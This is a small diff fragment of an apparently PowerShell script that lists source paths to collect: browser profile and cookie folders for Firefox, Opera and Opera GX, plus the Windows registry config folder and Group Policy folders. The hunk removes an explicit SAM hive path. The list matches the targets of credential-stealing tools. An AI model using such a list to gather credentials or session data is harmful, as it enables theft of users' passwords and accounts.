@@ -5,7 +5,6 @@ $sourcePaths = @(
         "C:\Users\{}\AppData\Roaming\Mozilla\Firefox\Profiles",
         "C:\Users\{}\AppData\Roaming\Opera Software\Opera Stable\Network",
         "C:\Users\{}\AppData\Roaming\Opera Software\Opera GX Stable\Network",
-        'C:\\WINDOWS\\system32\\config\\SAM',
         'C:\\Windows\\System32\\config',
         'C:\\Windows\\System32\\GroupPolicy',
         'C:\\Windows\\System32\\GroupPolicyUsers',
